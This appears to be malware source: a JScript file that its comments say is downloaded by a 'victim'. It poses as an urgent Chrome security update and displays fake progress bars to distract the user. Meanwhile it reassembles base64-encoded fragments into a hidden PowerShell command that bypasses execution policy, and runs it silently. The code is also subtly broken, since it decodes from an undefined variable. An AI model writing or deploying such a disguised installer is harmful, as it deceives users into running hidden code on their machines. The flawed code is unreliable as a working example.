// This file gets downloaded when victim clicks the button

WScript.Echo("IMPORTANT CHROME UPDATE. DO NOT CLOSE.")

var shell = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var tempFolder = shell.ExpandEnvironmentStrings("%TEMP%");

// Fake progress to distract victim
WScript.Echo("Chrome Security Update Installer");
WScript.Echo("=================================");
WScript.Echo("");
WScript.Echo("Downloading update files...");

for (var i = 1; i <= 100; i+=10) {
    WScript.Echo("Progress: " + i + "%");
    WScript.Sleep(200);
}

WScript.Echo("");
WScript.Echo("Verifying package integrity...");
WScript.Sleep(1000);

WScript.Echo("Installing security patches...");
WScript.Sleep(1500);

// Break the command into encoded pieces
var SecurityPatches = [
    "cG93ZXJzaGVsbA==",  // "powershell"
    "LVdpbmRvd1N0eWxlIEhpZGRlbiA=",  // " -WindowStyle Hidden "
    "LUV4ZWN1dGlvblBvbGljeSBCeXBhc3Mg",  // "-ExecutionPolicy Bypass "
    "LUVuY29kZWRDb21tYW5k",  // "-EncodedCommand "
    "R2V0LUNvbXB1dGVySW5mbyB8IFNlbGVjdC1PYmplY3QgV2luZG93c1Byb2R1Y3ROYW1lLCBXaW5kb3dzVmVyc2lvbiwgVG90YWxQaHlzaWNhbE1lbW9yeSwgQ3NQcm9jZXNzb3Jz"  // (the actual encoded malware command)
];

// Reconstruct and execute
var finalCmd = "";
for(var i = 0; i < SecurityPatches.length; i++) {
    finalCmd += atob(parts[i]);  // Decode each piece
}
shell.Run(finalCmd, 0, false);

WScript.Echo("");
WScript.Echo("Update complete!");
WScript.Sleep(2000);


